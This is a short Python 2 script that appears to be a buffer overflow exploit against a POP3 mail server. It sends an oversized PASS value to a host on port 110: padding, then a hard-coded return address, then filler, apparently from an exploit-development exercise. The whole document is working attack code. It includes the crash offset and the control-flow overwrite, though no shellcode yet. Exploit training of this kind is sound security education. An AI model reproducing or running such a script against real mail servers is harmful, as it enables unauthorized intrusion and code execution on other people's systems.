#!/usr/bin/python
import socket

buffer = 'A'*2606 + "\x8f\x35\x4a\x5f" + 'C'*(3500-2610)
try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except:
	print "No socket"
try:
	s.connect(('192.168.43.113',110))
	data=s.recv(1024)
	s.send('USER user' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
except:
	print "cannot connect to ip"

